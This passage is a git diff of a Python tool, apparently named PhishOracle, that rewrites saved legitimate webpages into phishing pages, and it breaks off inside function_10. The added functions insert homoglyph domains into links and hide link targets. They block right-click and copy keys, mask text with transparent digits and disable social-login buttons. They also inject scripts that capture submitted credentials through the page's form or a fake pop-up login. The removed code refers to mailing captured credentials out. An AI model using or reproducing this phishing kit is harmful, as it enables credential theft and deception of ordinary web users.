@@ -21,8 +21,8 @@ In this function, we create an anchor tag with empty content
 '''
 
 csv_file = 'legitimate_urls_with_index.csv'
-phishing_folder_path = "E:\\Complete_Python\\_PhishOracle_Webapp\\Phishing_Webpage\\"
-legitimate_folder_path = "E:\\Complete_Python\\_PhishOracle_Webapp\\"
+phishing_folder_path = "PATH_TO_SAVE_PHISHING_WEBPAGE"
+legitimate_folder_path = "PATH_TO_SAVE_LEGIIMATE_FOLDER"
 
 
 def function_1(target_file, obtained_soup_here):
@@ -43,7 +43,7 @@ def function_1(target_file, obtained_soup_here):
         el["href"] = random.choice(href_choice)
         el["onclick"] = ""
 
-    function_1_soup = copy.deepcopy(f1_soup.prettify())
+    function_1_soup = f1_soup.prettify()
 
     # write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
     # write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
@@ -82,174 +82,27 @@ def function_2(target_file):
     open_this = os.path.join(legitimate_sites_folder, str(target_file))
 
     # Disabling right click
+    f2_soup = ''
 
     with open(open_this, 'rb') as f_2_input:
         function_2_contents = f_2_input.read()
         f2_soup = BeautifulSoup(function_2_contents, 'lxml')
 
-        if f2_soup.find("body"):
-
-            body_tag = f2_soup.body
-            body_tag['onkeypress'] = "return disableCtrlKeyCombination(event);"
-            body_tag['onkeydown'] = "return disableCtrlKeyCombination(event);"
-            # body_tag['oncontextmenu'] = "return false;"
-
-            disable_tag = f2_soup.new_tag('script')
-            disable_tag['language'] = "JavaScript"
-            disable_tag['type'] = "text/javascript"
-            disable_tag.string = '''document.onkeypress = function (event) {
-            event = (event || window.event);
-            if (event.keyCode == 123) {
-               //alert('No F-12');
-                return false;
+    # Create a new script tag with the JavaScript content
+    script_tag = f2_soup.new_tag("script", type="text/javascript")
+    script_tag.string = """
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.addEventListener('keydown', function(event) {
+            if (event.ctrlKey) {
+                event.preventDefault();
             }
-        }
-        document.onmousedown = function (event) {
-            event = (event || window.event);
-            if (event.keyCode == 123) {
-                //alert('No F-keys');
-                return false;
-            }
-        }
-    document.onkeydown = function (event) {
-            event = (event || window.event);
-            if (event.keyCode == 123) {
-                //alert('No F-keys');
-                return false;
-            }
-        }
-    function clickIE() {if (document.all) {return false;}}
-    function clickNS(e) {if
-    (document.layers||(document.getElementById&&!document.all)) {
-    if (e.which==2||e.which==3) {(message);return false;}}}
-    if (document.layers)
-    {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
-    else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
-    document.oncontextmenu=new Function("return false")
-    //
-    function disableCtrlKeyCombination(e)
-    {
-    //list all CTRL + key combinations you want to disable
-    var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'v', 'j' , 'w', 'u');
-    var key;
-    var isCtrl;
-    if(window.event)
-    {
-    key = window.event.keyCode;     //IE
-    if(window.event.ctrlKey)
-    isCtrl = true;
-    else
-    isCtrl = false;
-    }
-    else
-    {
-    key = e.which;     //firefox
-    if(e.ctrlKey)
-    isCtrl = true;
-    else
-    isCtrl = false;
-    }
-    //if ctrl is pressed check if other key is in forbidenKeys array
-    if(isCtrl)
-    {
-    for(i=0; i<forbiddenKeys.length; i++)
-    {
-    //case-insensitive comparation
-    if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
-    {
-    <!--alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');-->
-    return false;
-    }
-    }
-    }
-    return true;
-    }
-            '''
-            f2_soup.html.head.append(disable_tag)
+        });
+        """
 
-        else:
-            new_html_tag = f2_soup.new_tag('html')
-            new_body_tag = f2_soup.new_tag('body')
-            new_body_tag['onkeypress'] = "return disableCtrlKeyCombination(event);"
-            new_body_tag['onkeydown'] = "return disableCtrlKeyCombination(event);"
-            # body_tag['oncontextmenu'] = "return false;"
+    # Inject the script tag into the head or body of the HTML
+    f2_soup.head.append(script_tag)  # or soup.body.append(script_tag)
 
-            disable_tag = f2_soup.new_tag('script')
-            disable_tag['language'] = "JavaScript"
-            disable_tag['type'] = "text/javascript"
-            disable_tag.string = '''document.onkeypress = function (event) {
-                        event = (event || window.event);
-                        if (event.keyCode == 123) {
-                           //alert('No F-12');
-                            return false;
-                        }
-                    }
-                    document.onmousedown = function (event) {
-                        event = (event || window.event);
-                        if (event.keyCode == 123) {
-                            //alert('No F-keys');
-                            return false;
-                        }
-                    }
-                document.onkeydown = function (event) {
-                        event = (event || window.event);
-                        if (event.keyCode == 123) {
-                            //alert('No F-keys');
-                            return false;
-                        }
-                    }
-                function clickIE() {if (document.all) {return false;}}
-                function clickNS(e) {if
-                (document.layers||(document.getElementById&&!document.all)) {
-                if (e.which==2||e.which==3) {(message);return false;}}}
-                if (document.layers)
-                {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
-                else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
-                document.oncontextmenu=new Function("return false")
-                //
-                function disableCtrlKeyCombination(e)
-                {
-                //list all CTRL + key combinations you want to disable
-                var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'v', 'j' , 'w', 'u');
-                var key;
-                var isCtrl;
-                if(window.event)
-                {
-                key = window.event.keyCode;     //IE
-                if(window.event.ctrlKey)
-                isCtrl = true;
-                else
-                isCtrl = false;
-                }
-                else
-                {
-                key = e.which;     //firefox
-                if(e.ctrlKey)
-                isCtrl = true;
-                else
-                isCtrl = false;
-                }
-                //if ctrl is pressed check if other key is in forbidenKeys array
-                if(isCtrl)
-                {
-                for(i=0; i<forbiddenKeys.length; i++)
-                {
-                //case-insensitive comparation
-                if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
-                {
-                <!--alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');-->
-                return false;
-                }
-                }
-                }
-                return true;
-                }
-                        '''
-            f2_soup.html.head.append(disable_tag)
-
-    import copy
-
-    function_2_soup = copy.deepcopy(f2_soup.prettify())
+    function_2_soup = f2_soup.prettify()
 
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
@@ -264,43 +117,60 @@ def function_2(target_file):
 
 '''
 =======================================    PHASE 3 (FUNCTION 3) BEGINS HERE  =======================================
-In this feature we add dummy comments
+In this feature we find and replace the domain name with look alike characters
 '''
+
+# Function to replace all characters in a domain to its look alike
+def replace_all_characters(text, replacements):
+    return ''.join(random.choice(replacements[char]) if char in replacements else char for char in text)
+
+
+# Function to replace one character in a domain of href to its look alike
+def replace_one_character(text, replacements):
+    chars = list(text)
+    indices = [i for i, char in enumerate(chars) if char in replacements]
+    if indices:
+        index = random.choice(indices)
+        chars[index] = random.choice(replacements[chars[index]])
+    return ''.join(chars)
+
+
+# Function to replace domain name in href
+def replace_domain_in_href(href, replacements):
+    # Use regex to extract the domain name
+    domain_pattern = re.compile(r'^(https?://)?([^/]+)')
+    match = domain_pattern.match(href)
+    if match:
+        domain = match.group(2)
+        modified_domain = replace_one_character(domain, replacements)
+        return href.replace(domain, modified_domain)
+    return href
 
 
 def function_3(target_file, obtained_soup_here):
-    print("Adding feature 'Comments'")
+    print("Adding feature look alike domain name")
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_3_input:
-    #     function_3_contents = f_3_input.read()
-    #     f3_soup = BeautifulSoup(function_3_contents, 'html.parser')
-    # comment_line = '''<b><!-- Comment Here --></b>'''
-    # break_tag = f3_soup.new_tag('br')
-    # break_tag.string = comment_line
-    # # f3_soup.html.body.append(break_tag)
-    # f3_soup.html.body.append(comment_line)
-
+    
     f3_soup = obtained_soup_here
-    comment_strings = ['''<b><!-- This code is used to get credentials --></b>''',
-                       '''<b><!-- The following code redirects to login page --></b>''',
-                       '''<b><!-- Code for adding username and password --></b>''']
-    for i in range(5):
-        comment_line_addition = random.choice(comment_strings)
-        f3_soup.html.body.append(BeautifulSoup(comment_line_addition, 'html.parser'))
-        f3_soup.prettify()
 
-    # with open(write_file_name, 'a', encoding='utf-8') as f_3_comment:
-    #     f_3_comment.write(comment_line)
+    # Define the look-alike characters
+    char_replacements = {
+        'a': ['ä', 'ẚ', 'á', 'ầ', 'ā', 'ä'],
+        'b': ['b̀', 'b̂', 'b̃', 'ḇ̂', 'b̤', 'b̥'],
+        'c': ['c̀', 'ć', 'c̃', 'c̈', 'ċ', 'c̓'],
+        'd': ['d̊', 'd́', 'ď', 'ḑ', 'đ', 'd̥'],
+        'e': ['è', 'ê', 'ē', 'ė', 'ë', 'e̊'],
+        'i': ['í', 'ǐ', 'i̎', 'ḭ', 'ị'],
+        'o': ['ó', 'ò', 'ṓ', 'ö', 'o̍']
+    }
 
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
+    for a_tag in f3_soup.find_all("a", href=True):
+        original_href = a_tag['href']
+        modified_href = replace_domain_in_href(original_href, char_replacements)
+        a_tag['href'] = modified_href
 
-    function_3_soup = copy.deepcopy(f3_soup.prettify())
-
+    function_3_soup = f3_soup.prettify()
     with open(write_file_name, 'w', encoding='utf-8') as f_3_output:
         f_3_output.write(str(function_3_soup))
 
@@ -311,40 +181,24 @@ def function_3(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 4) BEGINS HERE  =======================================
-Add dummy div tags with visibility:hidden
+In this feature we hide the links to appear on status bar on hovering links in a webpage when opened on a web browser
 '''
 
 
 def function_4(target_file, obtained_soup_here):
-    print("Adding feature 'Dummy div tags'")
+    print("Adding feature hiding links on status bar")
 
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_4_input:
-    #     function_4_contents = f_4_input.read()
-    #     f4_soup = BeautifulSoup(function_4_contents, 'html.parser')
-
+    
     f4_soup = obtained_soup_here
 
-    for i in range(0, 10):
-        additional_div_tags = f4_soup.new_tag("div")
-        additional_div_tags.string = "Here is the dummy text " + str(i) + " added in the body of the html file"
-        if additional_div_tags.has_attr('style'):
-            div_styles_present = additional_div_tags['style']
-            div_additional_styling = div_styles_present + "visibility: hidden;"
-            additional_div_tags['style'] = div_additional_styling
-        else:
-            additional_div_tags['style'] = "visibility: hidden;"
+    for a_tag in f4_soup.find_all('a', href=True):
+        original_href = a_tag['href']
+        a_tag['onclick'] = f"window.open('{original_href}'); return false;"
+        del a_tag['href']
 
-        f4_soup.html.body.append(additional_div_tags)
-
-    '''
-    Copy the contents to the file from the updates made from the soup to add dummy div tags
-    '''
-    import copy
-
-    function_4_soup = copy.deepcopy(f4_soup.prettify())
+    function_4_soup = f4_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_4_output:
         f_4_output.write(str(function_4_soup))
@@ -356,40 +210,27 @@ def function_4(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 5) BEGINS HERE  =======================================
-Add dummy script tags in head and body tag
+In this feature we disable the anchor links from getting clicked by mouse when opened on a web browser
 '''
 
 
 def function_5(target_file, obtained_soup_here):
-    print("Adding feature 'Dummy script tags'")
+    print("Adding feature to disable anchor tags")
 
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_5_input:
-    #     function_5_contents = f_5_input.read()
-    #     f5_soup = BeautifulSoup(function_5_contents, 'html.parser')
+    
     f5_soup = obtained_soup_here
-    script_tags_src = ["myScripts.js", "Scripts.js", "scripts.js", "Scripts/script.js", "scriptFolder/script.js"]
 
-    for i in range(0, 5):
-        additional_script_tags = f5_soup.new_tag("script")
-        additional_script_tags['type'] = "text/javascript"
-        additional_script_tags['src'] = random.choice(script_tags_src)
-        f5_soup.html.head.append(additional_script_tags)
+    for a_tag in f5_soup.find_all('a', href=True):
+        if a_tag.has_attr('style'):
+            present_style = a_tag['style']
+            new_style = present_style + 'cursor:not-allowed; text-decoration:none;'
+            a_tag['style'] = new_style
+        else:
+            a_tag['style'] = 'cursor:not-allowed; text-decoration:none;'
 
-    for i in range(0, 5):
-        additional_script_tags = f5_soup.new_tag("script")
-        additional_script_tags['type'] = "text/javascript"
-        additional_script_tags['src'] = random.choice(script_tags_src)
-        f5_soup.html.body.append(additional_script_tags)
-
-    '''
-    Copy the contents to the file from the updates made from the soup to add dummy script tags
-    '''
-    import copy
-
-    function_5_soup = copy.deepcopy(f5_soup.prettify())
+    function_5_soup = f5_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_5_output:
         f_5_output.write(str(function_5_soup))
@@ -401,42 +242,46 @@ def function_5(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 6) BEGINS HERE  =======================================
-Add dummy link tags in head tag
+In this feature we replace the white spaces between texts with a number from 0 to 9 and make it transparent
 '''
+
+# Function to replace white spaces with a number inside span elements
+def replace_whitespace_with_number(tag, f6_soup_cloned):
+    new_contents = []
+    for content in tag.contents:
+        if isinstance(content, str):
+            parts = content.split(' ')
+            for i, part in enumerate(parts):
+                new_contents.append(part)
+                if i < len(parts) - 1:
+                    # Create a new span with a random number
+                    span = f6_soup_cloned.new_tag('span')
+                    span.string = str(random.randint(0, 9))
+                    span['style'] = 'color: transparent;'
+                    new_contents.append(span)
+        else:
+            new_contents.append(content)
+
+    tag.clear()
+    for item in new_contents:
+        tag.append(item)
 
 
 def function_6(target_file, obtained_soup_here):
-    print("Adding feature 'Dummy link tags'")
+    print("Adding feature to replace blank space with a character")
 
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_6_input:
-    #     function_6_contents = f_6_input.read()
-    #     f6_soup = BeautifulSoup(function_6_contents, 'html.parser')
 
     f6_soup = obtained_soup_here
-    styling_directory = ["style.css", "Styles/styling.css", "styleFolder/styleCSS.css"]
 
-    for i in range(0, 5):
-        additional_link_tag = f6_soup.new_tag("link")
-        additional_link_tag['rel'] = "stylesheet"
-        additional_link_tag['type'] = "text/css"
-        additional_link_tag['href'] = random.choice(styling_directory)
-        if additional_link_tag.has_attr('style'):
-            link_styles_present = additional_link_tag['style']
-            link_additional_styling = link_styles_present + "display: none;"
-            additional_link_tag['style'] = link_additional_styling
-        else:
-            additional_link_tag['style'] = "display: none;"
-        f6_soup.html.head.append(additional_link_tag)
+    # Find and process specified tags
+    for tag_name in ["p", "h1", "h2", "h3", "span", "a"]:
+        tags = f6_soup.find_all(tag_name)
+        for tag in tags:
+            replace_whitespace_with_number(tag, f6_soup)
 
-    '''
-    Copy the contents to the file from the updates made from the soup to add dummy link tags
-    '''
-    import copy
-
-    function_6_soup = copy.deepcopy(f6_soup.prettify())
+    function_6_soup = f6_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_6_output:
         f_6_output.write(str(function_6_soup))
@@ -448,34 +293,66 @@ def function_6(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 7) BEGINS HERE  =======================================
-In this feature we add opacity to the body tag to make it blur
+In this feature we modify the action field in the form tag to save the credentials to local file
 '''
 
 
 def function_7(target_file, obtained_soup_here):
-    print("Adding feature 'Body opacity'")
+    print("Adding feature to modify action field to save form credentials")
 
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_7_input:
-    #     function_7_contents = f_7_input.read()
-    #     f7_soup = BeautifulSoup(function_7_contents, 'html.parser')
-
+    
     f7_soup = obtained_soup_here
-    if f7_soup.html.body.has_attr('style'):
-        body_styles_present = f7_soup.html.body['style']
-        body_additional_styling = body_styles_present + "opacity: 0.8;"
-        f7_soup.html.body['style'] = body_additional_styling
-    else:
-        f7_soup.html.body['style'] = "opacity:0.7;"
 
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
+    for form_tag in f7_soup.find_all('form'):
+        form_tag['action'] = ''
 
-    function_7_soup = copy.deepcopy(f7_soup.prettify())
+    # Add JavaScript code to handle form submission
+    script_code = """
+        <script>
+            function handleSubmit(event) {
+                event.preventDefault(); // Prevent form submission
+
+                // Get form inputs
+                var form = event.target;
+                var formData = new FormData(form);
+
+                // Convert FormData to object
+                var formObject = {};
+                formData.forEach(function(value, key){
+                    formObject[key] = value;
+                });
+
+                // Convert object to JSON string
+                var jsonData = JSON.stringify(formObject);
+
+                // Save data to a file
+                var fileContents = "Form Inputs:\\n" + jsonData;
+                var fileBlob = new Blob([fileContents], {type: "text/plain"});
+                var fileUrl = URL.createObjectURL(fileBlob);
+
+                // Create a link to download the file
+                var downloadLink = document.createElement("a");
+                downloadLink.href = fileUrl;
+                downloadLink.download = "form_inputs.txt";
+                downloadLink.click();
+            }
+
+            // Add event listener to the form
+            var formElement = document.querySelector('form');
+            if (formElement) {
+                formElement.addEventListener("submit", handleSubmit);
+            } else {
+                console.error("Form not found.");
+            }
+        </script>
+        """
+
+    # Append the JavaScript code to the end of the HTML body
+    f7_soup.body.append(BeautifulSoup(script_code, "html.parser"))
+
+    function_7_soup = f7_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_7_output:
         f_7_output.write(str(function_7_soup))
@@ -487,117 +364,51 @@ def function_7(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 8) BEGINS HERE  =======================================
-In this feature we pop-up the login form with out cross mark on the form to ensure the credentials are entered by the target
-Then, the inputs are saved in a .txt file to mail credentials using send_mail_inputs.py
+In this feature we disable other login buttons, except the one with the submit button of form
 '''
+# Function to disable an element
+def disable_element(element):
+    element['onclick'] = 'return false;'
+    element['style'] = 'pointer-events: none; cursor: default;'
 
 
 def function_8(target_file, obtained_soup_here):
+    print('Disabling other login buttons')
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_8_input:
-    #     function_8_contents = f_8_input.read()
-    #     f8_soup = BeautifulSoup(function_8_contents, 'html.parser')
-
+   
     f8_soup = obtained_soup_here
 
-    if f8_soup.find('form'):
-        print("Adding feature 'Pop-up Login'")
-        for form_element in f8_soup.find_all("form"):
-            form_element["action"] = ""
-        # div_tag = soup.form.div
-        # div_tag.decompose()
-        [input_tag.extract() for input_tag in f8_soup.findAll('input')]
-        [label_tag.clear() for label_tag in f8_soup.findAll('label')]
-        # for input_tag in soup.find_all('input'):
-        #     input_tag['style'] = "background: transparent; border:none;"
-        # soup.find('input').decompose()
-        # for input_tag in soup.find_all('input'):
-        #     input_tag['type'] = "hidden"
-        # soup.find("button")['id'] = "loginButton"
+    # Define the list of keywords to check in the text content
+    keywords = ['google', 'github', 'facebook', 'linkedin', 'twitter', 'instagram']
 
-        # pop_up_button = soup.new_tag("button")
-        for button_change in f8_soup.find_all('button'):
-            button_change['class'] = "_button"
-            button_change['href'] = "#"
-            button_change['onclick'] = "show('popup')"
-        # soup.html.body.append(pop_up_button)
+    # Iterate over each tag to check and disable
+    for tag in f8_soup.find_all('a'):
+        # Check if the text content contains any of the keywords
+        if any(keyword in tag.get_text().strip().lower() for keyword in keywords):
+            disable_element(tag)
 
-        # pop_up_div_tag_add = soup.new_tag("div")
-        pop_up_div_tag_add_string = '''<div class="popup" id="popup">
-                                            <div class="center">
-                                                <div class="container">
-                                                    <div class="text">Login Form</div>
-                                                    <form action="get_form_inputs.php" method="post">
-                                                        <div class="data"><label>Email or Phone</label>
-                                                            <input type="text" name="user_name" required>
-                                                        </div>
-                                                        <div class="data"><label>Password</label>
-                                                            <input type="password" name="user_password" required>
-                                                        </div>
-                                                        <div class="forgot-pass"><a href="#">Forgot Password?</a></div>
-                                                        <div class="btn">
-                                                            <div class="inner"></div>
-                                                            <button type="submit" name="submit" onclick="handler(onkeydown)">Login</button>
-                                                        </div>
-                                                        <div class="signup-link">Not a member? <a href="#">Signup now</a></div>
-                                                    </form>
-                                                </div>
-                                            </div>
-                                        </div>'''
-        f8_soup.html.body.append(BeautifulSoup(pop_up_div_tag_add_string, 'html.parser'))
-        f8_soup.prettify()
+    icon_classes = ['fa-google', 'fa-github', 'fa-facebook', 'fa-linkedin', 'fa-twitter', 'fa-instagram']
+    icon_aria_labels = ['google', 'github', 'facebook', 'linkedin', 'Twitter', 'Instagram']
 
-        script_tag_for_pop_up = f8_soup.new_tag("script")
-        script_tag_for_pop_up.string = '''$ = function(id) {return document.getElementById(id);}
-        var show = function(id){$(id).style.display ='block';}
-        var hide = function(id) {	$(id).style.display ='none';}'''
-        f8_soup.html.body.append(script_tag_for_pop_up)
+    # Check and disable <button> tags
+    for tag in f8_soup.find_all('button'):
+        if tag.get('type') == 'button':
+            if any(icon_aria_label in tag.get('aria-label', '').lower() for icon_aria_label in icon_aria_labels):
+                disable_element(tag)
+        else:
+            tag_text = tag.get_text().strip().lower()
+            if any(keyword in tag_text for keyword in keywords):
+                if any(icon_class in tag.get('class', []) for icon_class in icon_classes):
+                    disable_element(tag)
+                else:
+                    # Check for icons within the tag
+                    for icon_class in icon_classes:
+                        if tag.find(class_=icon_class):
+                            disable_element(tag)
+                            break
 
-        style_tag_for_pop_up = f8_soup.new_tag("style")
-        style_tag_for_pop_up.string = '''.container{position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);}
-                                        input[type="checkbox"]{display: none;}
-                                        .container{background: #fff;width: 410px;padding: 30px;box-shadow: 0 0 8px rgba(0,0,0,0.1);}
-                                        .container .text{font-size: 35px;font-weight: 600;text-align: center;}
-                                        .container form{margin-top: -20px;}
-                                        .container form .data{height: 45px;width: 100%;margin: 40px 0;}
-                                        form .data label{font-size: 18px;}
-                                        form .data input{height: 100%;width: 100%;padding-left: 10px;font-size: 17px;border: 1px solid silver;}
-                                        form .data input:focus{border-color: #3498db;border-bottom-width: 2px;}
-                                        form .forgot-pass{margin-top: -8px;}
-                                        form .forgot-pass a{color: #3498db;text-decoration: none;}
-                                        form .forgot-pass a:hover{text-decoration: underline;}
-                                        form .btn{margin: 30px 0;height: 45px;width: 100%;position: relative;overflow: hidden;}
-                                        form .btn .inner{height: 100%;width: 300%;position: absolute;left: -100%;z-index: -1;background: -webkit-linear-gradient(right, #512122, #31ac15, #255a21, #3020a0);transition: all 0.4s;}
-                                        form .btn:hover .inner{left: 0;}
-                                        form .btn button{height: 100%;width: 100%;background: none;border: none;color: #fff;font-size: 18px;font-weight: 500;text-transform: uppercase;letter-spacing: 1px;cursor: pointer;}
-                                        form .signup-link{text-align: center;}
-                                        form .signup-link a{color: #3498db;text-decoration: none;}
-                                        form .signup-link a:hover{text-decoration: underline;}
-                                        .popup {display: none;position: fixed;padding: 10px;width: 500px;left: 40%;margin-left: -100px;height: 500px;top: 20%;margin-top: -100px;background: #FFF;border: 3px solid #4e4a4a;z-index: 20;}
-                                        #popup:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
-                                        #popup:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
-                                        /* Styling buttons & webpage */
-                                        ._button {margin-top: 50px;background-color: rgba(255,255,255,0.3);border: 3px solid #595757;color: #4a4545;font-size: 25px;padding: 10px 20px;}
-                                        ._button:hover {background-color: #563e3e;color: #FFF;border: 3px solid #9a7373;transition: all 0.3s ease 0s;}
-                                        p {margin: 1em 0;font-size: 16px;}
-                                        .popupk {display: none;position: fixed;padding: 10px;width: 500px;left: 50%;margin-left: -150px;height: 500px;top: 50%;margin-top: -100px;background: #FFF;border: 3px solid #876565;z-index: 20;}
-                                        #popupk:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
-                                        #popupk:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
-                                        /* Styling buttons & webpage */
-                                        body {background: offwhite;font-family: Arial, sans-serif;text-align: center;}
-                                        ._button {margin-top: 10px;background-color: rgba(255,255,255,0.3);border: 1.5px solid #534242;color: #3e3939;font-size: 15px;padding: 5px 10px;}
-                                        ._button:hover {background-color: #473f3f;color: #FFF;border: 3px solid #6a5b5b;transition: all 0.3s ease 0s;}
-                                        p {margin: 1em 0;font-size: 16px;}'''
-        f8_soup.html.head.append(style_tag_for_pop_up)
-
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
-
-    function_8_soup = copy.deepcopy(f8_soup.prettify())
+    function_8_soup = f8_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_8_output:
         f_8_output.write(str(function_8_soup))
@@ -609,41 +420,109 @@ def function_8(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 9) BEGINS HERE  =======================================
-In this feature we add dummy images with visibility:hidden or display:none
+In this feature we make use of the pop up login and save the credentials to local
 '''
 
 
 def function_9(target_file, obtained_soup_here):
-    print("Adding feature 'Dummy image with no display'")
+    print("Adding feature pop-up login and save credentials")
 
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_9_input:
-    #     function_9_contents = f_9_input.read()
-    #     f9_soup = BeautifulSoup(function_9_contents, 'html.parser')
 
+    # Load HTML content from a file or obtained from previous steps
     f9_soup = obtained_soup_here
 
-    for i in range(0, 5):
-        image_tag = f9_soup.new_tag('img')
-        image_tag['src'] = "dummy_image.png"
-        image_tag['alt'] = ""
-        if image_tag.has_attr('style'):
-            image_styles_present = image_tag['style']
-            if "display:none;" not in image_styles_present:
-                image_additional_styling = image_styles_present + "display:none;"
-                image_tag['style'] = image_additional_styling
-        else:
-            image_tag['style'] = "display:none;"
-        f9_soup.html.body.append(image_tag)
+    # Ensure <html> and <body> tags exist
+    if f9_soup.html is None:
+        f9_soup.append(BeautifulSoup('<html></html>', 'html.parser'))
+    if f9_soup.html.body is None:
+        f9_soup.html.append(BeautifulSoup('<body></body>', 'html.parser'))
 
-    '''
-    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
-    '''
-    import copy
+    # Find the form tag that contains input fields
+    form_tag = f9_soup.find('form')
 
-    function_9_soup = copy.deepcopy(f9_soup.prettify())
+    if not form_tag:
+        print("No form tag found.")
+        return f9_soup.prettify()
+
+    # Copy the entire form tag to a variable
+    copied_form_html = str(form_tag.parent)
+
+    # Remove input tags from the original form
+    for input_tag in form_tag.find_all('input'):
+        input_tag.decompose()
+
+    # Add class, href, and onclick attributes to buttons
+    for button_change in f9_soup.find_all('button'):
+        button_change['class'] = "_button"
+        button_change['href'] = "#"
+        button_change['onclick'] = "showPopup()"
+        button_change.string = "Login"
+
+    # Create a div tag for the popup form
+    pop_up_div_tag_add_string = f'<div class="popup" id="popup" style="display: none; position: fixed; top: 50%; ' \
+                                f'left: 50%; transform: translate(-50%, -50%); background-color: white; padding: ' \
+                                f'20px; border: 1px solid #ccc; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2); z-index: ' \
+                                f'9999;">{copied_form_html}</div> '
+    pop_up_div_tag = BeautifulSoup(pop_up_div_tag_add_string, 'html.parser')
+
+    # Append the div tag for the popup form to the body
+    f9_soup.html.body.append(pop_up_div_tag)
+
+    # Add JavaScript code to show and hide the popup
+    script_tag_for_pop_up = f"""
+        <script>
+            function showPopup() {{
+                document.getElementById('popup').style.display = 'block';
+            }}
+
+            function hidePopup() {{
+                document.getElementById('popup').style.display = 'none';
+            }}
+
+            function handleSubmit(event) {{
+                event.preventDefault(); // Prevent form submission
+
+                // Get form inputs
+                var form = event.target;
+                var formData = new FormData(form);
+
+                // Convert FormData to object
+                var formObject = {{}};
+                formData.forEach(function(value, key){{
+                    formObject[key] = value;
+                }});
+
+                // Convert object to JSON string
+                var jsonData = JSON.stringify(formObject);
+
+                // Save data to a file
+                var fileContents = "Form Inputs:\\n" + jsonData;
+                var fileBlob = new Blob([fileContents], {{type: "text/plain"}});
+                var fileUrl = URL.createObjectURL(fileBlob);
+
+                // Create a link to download the file
+                var downloadLink = document.createElement("a");
+                downloadLink.href = fileUrl;
+                downloadLink.download = "form_inputs.txt";
+                downloadLink.click();
+            }}
+
+            document.addEventListener("DOMContentLoaded", function() {{
+                var popupForm = document.querySelector("#popup form");
+                if (popupForm) {{
+                    popupForm.addEventListener("submit", handleSubmit);
+                }} else {{
+                    console.error("Popup form not found.");
+                }}
+            }});
+        </script>
+        """
+    f9_soup.html.body.append(BeautifulSoup(script_tag_for_pop_up, 'html.parser'))
+
+    # Save the modified HTML content to a file or use it further
+    function_9_soup = f9_soup.prettify()
 
     with open(write_file_name, 'w', encoding='utf-8') as f_9_output:
         f_9_output.write(str(function_9_soup))
@@ -655,132 +534,96 @@ def function_9(target_file, obtained_soup_here):
 
 '''
 =======================================    PHASE 3 (FUNCTION 10) BEGINS HERE  =======================================
-In this feature we add a set of dummy anchor tags and few redirect to the same web page and others are disabled
+In this feature we make various anchor tags that when clicked will open pop-up login form
 '''
 
 
 def function_10(target_file, obtained_soup_here):
-    print("Adding feature 'Dummy anchor tags with few of redirecting and few disabled'")
+    print("Adding feature to use pop-up login on various anchor tags")
     write_file = phishing_folder_path
     write_file_name = os.path.join(write_file, str(target_file))
-    #
-    # with open(write_file_name, 'rb') as f_10_input:
-    #     function_10_contents = f_10_input.read()
-    #     f10_soup = BeautifulSoup(function_10_contents, 'html.parser')
-
+    
+    # Load HTML content from a file or obtained from previous steps
     f10_soup = obtained_soup_here
 
-    # Find all the anchor tags in the HTML
-    anchors = f10_soup.find_all("a")
+    # Find the form tag containing input fields and copy its content to a variable
+    form_tag = f10_soup.find("form")
+    copied_form_html = str(form_tag.parent)
 
